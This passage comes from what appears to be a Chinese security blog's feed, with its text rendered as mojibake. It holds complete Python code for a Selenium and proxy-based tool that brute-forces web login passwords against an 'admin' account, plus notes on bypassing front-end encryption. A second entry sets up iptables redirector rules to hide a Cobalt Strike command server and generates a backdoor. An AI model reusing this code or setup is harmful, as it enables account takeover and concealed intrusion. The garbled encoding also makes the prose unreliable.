class="line">print(&quot;Chromeæµè§ˆå™¨å¯åŠ¨å¤±è´¥ï¼\n&quot;)</span><br><span class="line">return 0</span><br><span class="line">def fill_out_a_form(self,username,password):</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input ivu-input-with-prefix&#39;]&quot;).send_keys(</span><br><span class="line">username)</span><br><span class="line">self.chrome.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;ivu-input  ivu-input-with-suffix&#39;]&quot;).send_keys(password)</span><br><span class="line">self.chrome.find_element_by_css_selector((&quot;[class&#x3D;&#39;ivu-btn ivu-btn-primary  ivu-btn-large&#39;]&quot;)).click()</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;iivu-input ivu-input-with-prefix&#39;]&quot;).clear()</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input  ivu-input-with-suffix&#39;]&quot;).clear()</span><br><span class="line">def wget_response(self):</span><br><span class="line">result &#x3D; self.proxy.har</span><br><span class="line">for entry in result[&#39;log&#39;][&#39;entries&#39;]:</span><br><span class="line">_url &#x3D; entry[&#39;request&#39;][&#39;url&#39;]</span><br><span class="line">print(_url)</span><br><span class="line">if &quot;password&quot; in _url and &quot;username&quot; in _url:</span><br><span class="line">_response &#x3D; entry[&#39;response&#39;]</span><br><span class="line">_content &#x3D; _response[&#39;content&#39;]</span><br><span class="line"># è·å–æ¥å£è¿”å›å†…å®¹</span><br><span class="line">self.response_result.append(_response[&#39;content&#39;][&#39;text&#39;])</span><br><span class="line">self.result &#x3D; dict(zip(self.password_list, self.response_result))</span><br><span class="line">def result_handing(self):</span><br><span class="line">for key,value in self.result.items():</span><br><span class="line">print(&quot;å¯†ç ï¼š&#123;key&#125; :ç»“æœï¼š&#123;result&#125;&quot;.format(key&#x3D;key,result&#x3D;value))</span><br><span class="line">def end_env(self):</span><br><span class="line">try:</span><br><span class="line">self.server.stop()</span><br><span class="line">self.chrome.quit()</span><br><span class="line">find_netstat &#x3D; os.popen(&quot;netstat -ano | findstr 8080&quot;)#å¼€çš„ä»€ä¹ˆç«¯å£æ€ä»€ä¹ˆç«¯å£çš„è¿›ç¨‹</span><br><span class="line">pid &#x3D; find_netstat.read().split()[4]</span><br><span class="line">kail_pid &#x3D; os.popen(&quot;taskkill &#x2F;F &#x2F;PID &#123;PID&#125;&quot;.format(PID&#x3D;pid))</span><br><span class="line">print(kail_pid.read())</span><br><span class="line">return 1</span><br><span class="line">except IndexError as e:</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">Brower &#x3D; Brower_scan(url,&#39;admin&#39;,&#39;password.txt&#39;)</span><br></pre></td></tr></table></figure><p>æ‹¿å»å®æˆ˜çˆ†ç ´æ•ˆæœä¸€æµè§ˆ:</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/619490803.png"></p><blockquote><p>å‘ç‚¹2<br>å®é™…çˆ†ç ´æ•ˆæœä¸æ˜¯è¿™æ ·çš„<br>å¯†ç è¾“å…¥ä¾æ¬¡ä¸º 123456 123456456789 123456455678955664 â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ä¸€ç›´å¢å¤§ ,å¥½åƒç¼“å­˜æ²¡æœ‰æ¸…æ¥šä¸€æ ·,ä½†æ˜¯æˆ‘å®é™…ç¡®å®clearäº†</p></blockquote><p>è¿™ä¸ªé—®é¢˜æŠŠæˆ‘æäº†å¾ˆä¹…,ç™¾æ€ä¸å¾—å…¶è§£<br>æœ€å,åœ¨éƒ¨é—¨å¤§ç¥çš„æŒ‡ç‚¹ä¸‹,æˆåŠŸæ‰¾åˆ°åŸå› ,å¹¶è§£å†³é—®é¢˜,æœç„¶å¬å›ä¸€å¸­è¯,èƒœè¯»10å¹´ä¹¦,ä¸æ„§æ˜¯å¤§ä½¬!!</p><blockquote><p>å› ä¸ºèµ·çš„æµè§ˆå™¨é»˜è®¤æ˜¯è®°ä½ä¸Šæ¬¡å¯†ç çš„,å½“æˆ‘è¾“å…¥ä¸€ä¸ªadminè´¦å·çš„æ—¶å€™,åœ¨è¾“å…¥å¯†ç ,ç„¶åæµè§ˆå™¨è®°ä½äº†æˆ‘çš„è´¦å·äº†,è™½ç„¶é”™è¯¯,ç„¶åç»§ç»­è¾“å…¥admin,ç„¶åæµè§ˆå™¨ä¼šè‡ªåŠ¨è¡¥å…¨123456,ç„¶åæˆ‘å†è¾“å…¥äº†ä¸€ä¸ª456789 ç»“æœå°±æˆäº†123456456789äº†â€¦.. å°±è¿™ä¸ªç†</p></blockquote><p>æ›´æ”¹åªéœ€è¦æŠŠé¡ºåºè°ƒæ¢ä¸€ä¸‹å°±è¡Œäº†:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(</span><br><span class="line">username)</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br><span class="line">self.chrome.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)</span><br><span class="line">self.chrome.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).click()</span><br></pre></td></tr></table></figure><p>åªéœ€è¦åœ¨å®ƒè¡¥å…¨ä¹‹å‰,å†æ¬¡clearå°±è¡Œ</p><blockquote><p>å‘ç‚¹3<br>å¦‚æœç™»å½•æ ‡ç­¾ä½¿ç”¨clickå±æ€§,å› ä¸ºå…ƒç´ è¢«åŒ…è£¹çš„é—®é¢˜,clickå¤šäº†ä¼šæŠ¥é”™!,è§£å†³åŠæ³•æ˜¯ä½¿ç”¨send_keys()</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.chrome.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).send_keys(Keys.RETURN)</span><br></pre></td></tr></table></figure><p>å¥½äº†è¿™é‡ŒåŸºæœ¬ä¸Šè§£å†³äº†æ‰€ä»¥çš„å‘ç‚¹,ä½†æ˜¯å®é™…çš„å‘ç‚¹å¾ˆå¤š,æˆ‘åªæ˜¯æŠŠä¸»è¦çš„å‡ ç‚¹æ”¾å‡ºæ¥è®²äº†ä¸€ä¸‹,æœ€ç»ˆä»£ç :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">from selenium.webdriver.common.desired_capabilities import DesiredCapabilities</span><br><span class="line">from browsermobproxy import Server</span><br><span class="line">from selenium.webdriver.chrome.options import Options</span><br><span class="line">class Brower_scan():</span><br><span class="line">def __init__(self,url,username,password_dir):</span><br><span class="line">self.url &#x3D; url</span><br><span class="line">self.response_result &#x3D; []</span><br><span class="line">self.result&#x3D;&#123;&#125;</span><br><span class="line">self.init_browsermobproxy()</span><br><span class="line">self.init_chrome()</span><br><span class="line">self.init_dict_list(username,password_dir)</span><br><span class="line">self.result_handing()</span><br><span class="line">self.end_env()</span><br><span class="line">def init_dict_list(self,username,password_dir):</span><br><span class="line">with open(password_dir,&quot;r&quot;) as f:</span><br><span class="line">self.password_list &#x3D; f.readlines()</span><br><span class="line">for password in self.password_list:</span><br><span class="line">self.fill_out_a_form(username,password.replace(&#39;\n&#39;,&#39;&#39;))</span><br><span class="line">self.wget_response()</span><br><span class="line">def init_browsermobproxy(self):</span><br><span class="line">self.server &#x3D; Server(&quot;browsermob-proxy-2.1.4\\bin\\browsermob-proxy.bat&quot;)#browermobproxyæ–‡ä»¶çš„ä½ç½®</span><br><span class="line">self.server.start()</span><br><span class="line">self.proxy &#x3D; self.server.create_proxy()</span><br><span class="line">self.chrome_options &#x3D; Options()</span><br><span class="line">self.chrome_options.add_argument(&quot;â€“incognito&quot;)</span><br><span class="line">self.chrome_options.add_argument(&#39;--proxy-server&#x3D;&#123;0&#125;&#39;.format(self.proxy.proxy))</span><br><span class="line">self.chrome_options.add_argument(&#39;--headless&#39;)#è¿™é‡ŒåŠ äº†ä¸€ä¸ªå‚æ•°,ä¸å¯åŠ¨chromeæµè§ˆå™¨,çœå»äº†å¯åŠ¨çš„æ—¶é—´,æ›´å¿«äº†</span><br><span class="line">def init_chrome(self):</span><br><span class="line">try:</span><br><span class="line">self.chrome &#x3D; webdriver.Chrome(chrome_options&#x3D;self.chrome_options)</span><br><span class="line">self.proxy.new_har(&quot;test&quot;, options&#x3D;&#123;&#39;captureContent&#39;: True, &#39;captureHeaders&#39;: True&#125;)</span><br><span class="line">self.chrome.get(self.url)</span><br><span class="line">except Exception as e:</span><br><span class="line">print(&quot;Chromeæµè§ˆå™¨å¯åŠ¨å¤±è´¥ï¼\n&quot;)</span><br><span class="line">return 0</span><br><span class="line">def fill_out_a_form(self,username,password):</span><br><span class="line">print(password)</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()#æ¸…ç©ºusernameè¾“å…¥æ¡†çš„æ ‡ç­¾</span><br><span class="line"></span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input ivu-input-large ivu-input-with-prefix&#39;]&quot;).send_keys(</span><br><span class="line">username)#è¾“å…¥ç”¨æˆ·å</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input ivu-input-large ivu-input-with-prefix ivu-input-with-suffix&#39;]&quot;).clear()#æ¸…ç©ºpasswordè¾“å…¥æ¡†çš„æ ‡ç­¾</span><br><span class="line">self.chrome.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)#è¾“å…¥ç”¨æˆ·å</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(Keys.RETURN)#ç‚¹å‡»ç™»å½•</span><br><span class="line"></span><br><span class="line">def wget_response(self):</span><br><span class="line">result &#x3D; self.proxy.har</span><br><span class="line">for entry in result[&#39;log&#39;][&#39;entries&#39;]:</span><br><span class="line">_url &#x3D; entry[&#39;request&#39;][&#39;url&#39;]</span><br><span class="line">if &quot;password&quot; in _url and &quot;username&quot; in _url:</span><br><span class="line">_response &#x3D; entry[&#39;response&#39;]</span><br><span class="line">_content &#x3D; _response[&#39;content&#39;]</span><br><span class="line"># è·å–æ¥å£è¿”å›å†…å®¹</span><br><span class="line">self.response_result.append(_response[&#39;content&#39;][&#39;text&#39;])</span><br><span class="line">self.result &#x3D; dict(zip(self.password_list, self.response_result))</span><br><span class="line">def result_handing(self):</span><br><span class="line">for key,value in self.result.items():</span><br><span class="line">print(&quot;å¯†ç ï¼š&#123;key&#125; :ç»“æœï¼š&#123;result&#125;&quot;.format(key&#x3D;key,result&#x3D;value))</span><br><span class="line">def end_env(self):</span><br><span class="line">try:</span><br><span class="line">self.server.stop()</span><br><span class="line">self.chrome.quit()</span><br><span class="line">find_netstat &#x3D; os.popen(&quot;netstat -ano | findstr 8080&quot;)#å¼€çš„ä»€ä¹ˆç«¯å£æ€ä»€ä¹ˆç«¯å£çš„è¿›ç¨‹</span><br><span class="line">pid &#x3D; find_netstat.read().split()[4]</span><br><span class="line">kail_pid &#x3D; os.popen(&quot;taskkill &#x2F;F &#x2F;PID &#123;PID&#125;&quot;.format(PID&#x3D;pid))</span><br><span class="line">print(kail_pid.read())</span><br><span class="line">return 1</span><br><span class="line">except IndexError as e:</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">Brower &#x3D; Brower_scan(url,&#39;admin&#39;,&#39;password.txt&#39;)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»…ä»…æŠŠè¿™ç§æ–¹å¼åˆ©ç”¨åœ¨å¯†ç çˆ†ç ´ä¸Šé¢,ä½†æ˜¯å®é™…çš„åˆ©ç”¨åœºæ™¯è¿œä¸æ­¢è¿™äº›,æˆ‘è§‰å¾—å¯ä»¥åˆ©ç”¨ä»»ä½•jsåŠ å¯†,jqåŠ å¯†çš„,å‰ç«¯åŠ å¯†çš„åœºæ™¯,éƒ½å¯ä»¥ç”¨åˆ°,æ ¹æœ¬ä¸éœ€è¦å»åˆ†æå®ƒçš„jså‰ç«¯åŠ å¯†ä»£ç ,åªéœ€è¦æŠŠçˆ†ç ´è¡Œä¸ºæ¨¡æ‹Ÿæ­£å¸¸çš„ç”¨æˆ·è¡Œä¸ºå°±æ¬§å…‹äº†,ä¸å¾—ä¸è¯´,è¿™ç§æ™ºèƒ½çš„æ–¹å¼çœŸçš„å¤ªæ–¹ä¾¿äº†!å¤ªé¦™äº†!!!!!!!!</p><p>githubå·²ç»ä¸Šä¼ äº†ä¸€ä¸ªæˆ‘å·²ç»å†™å¥½çš„çˆ†ç ´ç™»å½•ç•Œé¢è´¦å·å’Œå¯†ç çš„,å¤§å®¶å¯ä»¥å»ä¸‹è½½è‡ªè¡Œäº«ç”¨!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Gamma-laboratory&#x2F;JsFak</span><br><span class="line">ç°åœ¨åªæ”¯æŒé€šè¿‡classæ¥æŸ¥æ‰¾è¾“å…¥æ¡†å’Œç™»å½•æŒ‰é’®ï¼Œå¦‚æœéœ€è¦é€šè¿‡idæˆ–å…¶ä»–æ ‡è¯†ï¼Œå¯ä»¥ä¿®æ”¹æºç </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
            <tag> JaFak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¾ç½®iptablesè§„åˆ™æ¥ä¿æŠ¤CSæœåŠ¡å™¨</title>
      <link href="2020/12/11/%E8%AE%BE%E7%BD%AEiptables%E8%A7%84%E5%88%99%E6%9D%A5%E4%BF%9D%E6%8A%A4CS%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>2020/12/11/%E8%AE%BE%E7%BD%AEiptables%E8%A7%84%E5%88%99%E6%9D%A5%E4%BF%9D%E6%8A%A4CS%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰åœ¨ç½‘ç»œä¸Šçœ‹åˆ°å¤§å¤šéƒ½ä½¿ç”¨socatè¿™ä¸ªå·¥å…·è¿›è¡Œæµé‡è½¬å‘ï¼Œä½†æœ€è¿‘å’Œä¸€äº›å¸ˆå‚…äº¤æµäº†è§£åˆ°ï¼Œæœ‰æ—¶å€™ä½¿ç”¨socatè¿›è¡Œè½¬å‘çš„æ—¶å€™å…¶ç¨³å®šæ€§ä»¥åŠé€Ÿç‡å¯èƒ½ä¸æ˜¯é‚£ä¹ˆå¥½ï¼Œå¯¹äºæµé‡æ¯”è¾ƒå¤šçš„æƒ…å†µä¹Ÿè®¸å¯ä»¥ä½¿ç”¨iptablesè¿›è¡Œæ­¤æ“ä½œï¼ŒåŒæ—¶å¯¹csæœåŠ¡å™¨è®¾å®šä¸€äº›è®¿é—®ç­–ç•¥ï¼Œå¯¹çœŸå®çš„csæœåŠ¡å™¨èµ·åˆ°ä¸€å®šä¿æŠ¤ä½œç”¨ã€‚è¿™é‡Œç®€å•è¯´ä¸€ä¸‹iptablesåœ¨æ­¤åœºæ™¯çš„ä½¿ç”¨ï¼Œå„ä½å¸ˆå‚…å¦‚æœ‰å…¶ä»–çš„æ€è·¯æˆ–è€…å·¥å…·è¿˜è¯·å¤šå¤šäº¤æµ</p><h1 id="iptablesä¸­çš„â€œå››è¡¨äº”é“¾â€åŠâ€œæ‹¥å µç­–ç•¥â€"><a href="#iptablesä¸­çš„â€œå››è¡¨äº”é“¾â€åŠâ€œæ‹¥å µç­–ç•¥â€" class="headerlink" title="iptablesä¸­çš„â€œå››è¡¨äº”é“¾â€åŠâ€œæ‹¥å µç­–ç•¥â€"></a>iptablesä¸­çš„â€œå››è¡¨äº”é“¾â€åŠâ€œæ‹¥å µç­–ç•¥â€</h1><p>â€œå››è¡¨â€æ˜¯æŒ‡ï¼Œiptablesçš„åŠŸèƒ½â€”â€”filter, nat, mangle, raw</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filterï¼šæ§åˆ¶æ•°æ®åŒ…æ˜¯å¦å…è®¸è¿›å‡ºåŠè½¬å‘ï¼ˆINPUTã€OUTPUTã€FORWARDï¼‰,å¯ä»¥æ§åˆ¶çš„é“¾è·¯ æœ‰input, forward, output</span><br><span class="line"></span><br><span class="line">natï¼šæ§åˆ¶æ•°æ®åŒ…ä¸­åœ°å€è½¬æ¢ï¼Œå¯ä»¥æ§åˆ¶çš„é“¾è·¯æœ‰preroutingï¼ˆè·¯ç”±å‰ï¼‰, input, output, postrouting</span><br><span class="line"></span><br><span class="line">mangleï¼šä¿®æ”¹æ•°æ®åŒ…ä¸­çš„åŸæ•°æ®ï¼Œå¯ä»¥æ§åˆ¶çš„é“¾è·¯æœ‰preroutingï¼‰, input, forward, output, postrouting</span><br><span class="line"></span><br><span class="line">rawï¼šæ§åˆ¶natè¡¨ä¸­è¿æ¥è¿½è¸ªæœºåˆ¶çš„å¯ç”¨çŠ¶å†µï¼Œå¯ä»¥æ§åˆ¶çš„é“¾è·¯æœ‰prerouting, output</span><br></pre></td></tr></table></figure><p>æœ‰å…³iptableså…·ä½“ä»‹ç»å¯ä»¥çœ‹ä¸‹é¢è¿™ç¯‡æ–‡ç« </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;vathe&#x2F;p&#x2F;6973656.html</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables â€“[A|I é“¾] [-i|o ç½‘ç»œæ¥å£] [-p åè®®] [-s æ¥æºip&#x2F;ç½‘åŸŸ] [-d ç›®æ ‡ip&#x2F;ç½‘åŸŸ] â€“j[ACCEPT|DROP]</span><br></pre></td></tr></table></figure><h1 id="Iptablesè®¾ç½®"><a href="#Iptablesè®¾ç½®" class="headerlink" title="Iptablesè®¾ç½®"></a>Iptablesè®¾ç½®</h1><p>é¦–å…ˆæˆ‘éœ€è¦åœ¨è·³æ¿æœºAä¸Šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†8081ç«¯å£æ¥æ”¶åˆ°çš„æµé‡è½¬å‘è‡³CSæœåŠ¡å™¨çš„80ç«¯å£ ï¼ˆåè®®å’Œç«¯å£å¯è‡ªç”±æ›¿æ¢ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m tcp --dport 8081 -j ACCEPT</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 8081 -j DNAT --to-destination xxx.xxx.xxx.xxx:8081&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª45323æ˜¯æˆ‘çš„teamserverè¿æ¥ç«¯å£ï¼Œæˆ‘ä¹Ÿç»™è½¬å‘åˆ°è·³æ¿æœºä¸Šå»äº†ï¼Œä»¥åéƒ½ä»è·³æ¿æœºè¿›è¡Œç™»å½•äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m tcp --dport 45323 -j ACCEPT iptables -t nat -A PREROUTING -p tcp --dport 45323 -j DNAT --to-destination xxx.xxx.xxx.xxx:45323 iptables -t nat -A POSTROUTING -j MASQUERADE sysctl net.ipv4.ip_forward&#x3D;1</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨iptables -nL â€“line-number -t è¡¨å æŸ¥çœ‹å½“å‰è®¾ç½®å¥½çš„è§„åˆ™</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2838388474.png"></p><p>ç„¶åæˆ‘ä»¬åœ¨csæœåŠ¡å™¨ä¸Šè®¾ç½®å¯¹8081ç«¯å£ï¼Œä»¥åŠ45323ç«¯å£çš„è®¿é—®æ§åˆ¶ï¼Œä»¥åŠåœ¨csæœåŠ¡å™¨ä¸Šè®¾ç½® å¯¹æ•´ä¸ªæœåŠ¡å™¨ï¼ˆå…¨éƒ¨ipï¼‰ç¦æ­¢9100ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 8081 -j DROP</span><br><span class="line">iptables -I INPUT -p tcp --dport 45323 -j DROP &#x2F;&#x2F;åªå…è®¸è·³æ¿æœºè®¿é—®è¿™äº›ç«¯å£ç«¯å£ </span><br><span class="line">iptables -I INPUT -s xxx.xxx.xxx.xxx -p tcp --dport 8081 -j ACCEPT</span><br><span class="line">iptables -I INPUT -s xxx.xxx.xxx.xxx -p tcp --dport 45323 -j ACCEPT</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2057200037.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° æˆªå›¾é‡ŒåŒæ„æ¥è‡ªxxxxè®¿é—®45323,8081ç«¯å£ï¼Œæ‹’ç»äº†å…¶ä»–åœ°å€å¯¹45323ä»¥åŠ8081ç«¯å£çš„è®¿é—®ï¼Œiptablesçš„ç­–ç•¥è®¾ç½®å®Œæˆ</p><h1 id="CSé…ç½®ä»¥åŠåº”ç”¨"><a href="#CSé…ç½®ä»¥åŠåº”ç”¨" class="headerlink" title="CSé…ç½®ä»¥åŠåº”ç”¨"></a>CSé…ç½®ä»¥åŠåº”ç”¨</h1><p>ok æˆ‘ä»¬æ‰“å¼€cs è¿æ¥è¯•ä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3990699447.png"></p><p>ä¸å‡ºæ„å¤–è¿æ¥å¤±è´¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2158157351.png"></p><p>æŠŠæœåŠ¡å™¨åœ°å€æ”¹æˆè·³æ¿æœºçš„ip</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/490499920.png"></p><p>ok è¿æ¥æˆåŠŸ<br>ç„¶åæˆ‘ä»¬å»ºç«‹ä¸€ä¸ªhttpçš„ç›‘å¬å™¨çœ‹çœ‹ï¼Œhostå’Œstageréƒ½å¡«å†™æˆ‘çš„è·³æ¿æœº</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4053962516.png"></p><p>ç®€å•ç”Ÿæˆä¸€ä¸ªåé—¨</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1039569425.png"></p><p>è¿è¡Œä¸Šçº¿ï¼Œå¯ä»¥çœ‹åˆ°csçš„webæ—¥å¿—æ˜¾ç¤ºå‡ºæˆ‘çš„è·³æ¿æœºè®¿é—®äº† checksum8ç®—æ³•ç”Ÿæˆçš„url</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1522326179.png"></p><p>æœ€è¿‘çœ‹åˆ°ä¸€äº›æ–‡ç« é€šè¿‡URLçš„ç”Ÿæˆç®—æ³•ï¼Œä»¥åŠå¯¹Beacon stageçš„è§£ææ¥å¯»æ‰¾Beacon staging server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;WUf96myUi8F3X_eNWPRTdw</span><br></pre></td></tr></table></figure><p>å¯¹äºå¦‚ä½•Bypass cs beaconçš„æ‰«æï¼Œå„ä½å¯ä»¥çœ‹ä¸‹è¿™ç¯‡æ–‡ç« </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;fhcTTWV4Ddz4h9KxHVRcnw</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3131949141.png"></p><p>è®¿é—®è·³æ¿æœºçš„æ­¤ç›®å½•å¯ä¸‹è½½stageæ–‡ä»¶ï¼Œç›´æ¥è®¿é—®çœŸå®çš„csæœåŠ¡å™¨åˆ™æ— æ³•ä¸‹è½½ã€‚å½“ç„¶è¿™ç§åŠæ³•æ²»æ ‡ä¸æ²»æœ¬ï¼Œåªèƒ½å¯¹çœŸå®çš„csæœåŠ¡å™¨èµ·åˆ°é‚£ä¹ˆä¸€ç‚¹ä¿æŠ¤ä½œç”¨ï¼ŒcsæœåŠ¡å™¨çš„ä¸€äº›å‰æœŸéšè—å·¥ä½œå’Œæ£€æµ‹è§„é¿æ‰‹æ®µç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€æ–‡çœ‹æ‡‚shiroååºåˆ—åŒ–æ¼æ´</title>
      <link href="2020/12/09/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/12/09/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
